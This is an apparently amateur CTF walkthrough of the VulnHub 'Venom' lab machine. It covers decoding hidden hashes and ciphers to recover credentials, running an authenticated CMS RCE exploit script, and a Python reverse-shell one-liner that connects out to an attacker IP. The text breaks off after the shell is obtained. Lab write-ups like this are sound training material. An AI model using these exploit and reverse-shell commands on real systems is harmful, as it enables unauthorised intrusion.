In this walkthrough,FTP service lead us to enumerate information from hostinger user , which has a encryption todo list then from that information weâ€™ll gain remote code execution on webapplication (which is running ) and  ,once we are in machine at backups.bak folder we'll get a user password , this user can run the SUID find as root which leverage us to gain root access

Checked for anonymous ftp login , it says access denied so move towords port 80 which is runnig default web apache service

```
curl http://10.0.2.96/
```
on reviewing the apache default page at end of code there is some code commented out seems to be intresting  

```html
</html>
<!...<5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....-->

```

its a `md5` hash on decoding it revels

`5f2a66f947fa5690c26506f66bde5c23:hostinger`

reuse! login's 
so login the hostinger users with same passwd 

```

* You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=
* some knowledge of cipher is required to decode the dora password..
* try on venom.box
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password 

```
Here there are `base64 encoded ` keys words and a domain 

on decoding the base64 code here how it looks

```
You need to follow the 'hostinger' on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher
* some knowledge of cipher is required to decode the dora password..
* try on venom.box
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password
```

here there also a user `dora` 

so now need to crack the `L7f9l8@J#p%Ue+Q1234`

this is cipher encoded string which requried a key to dehash into plain text 

from above url cryptii.com lets decode the string 

![]({{site.baseurl}}/img/vulnhub/Venom/decode.png)

also add the domain into `/etc/hosts` file 

now its display actuall wepage nice

![]({{site.baseurl}}/img/vulnhub/Venom/doamin.png)

# Exploitation 

Checking the cms version it is vulnerable to Auth RCE

```
so lets use 49876.py which allows to use RCE

on displaying help it requries three parameters

```python
python 49876.py -h 
Usage: 49876.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri http://target/panel
  -l USER, --user=USER  User credential to login
  -p PASSW, --passw=PASSW
                        Password credential to login
```

```python
python 49876.py --user dora --passw E7r9t8@Q#h%Hy+M1234 --url http://venom.box/panel/

$ which bash 
/bin/bash

```

now we are into machine , tried to spawn the interactive shell with python ttyl but it is not spawing the shell so lets execute the python reverse shell  

```
export RHOST="10.0.2.93";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

this returned us the new python shell 

```
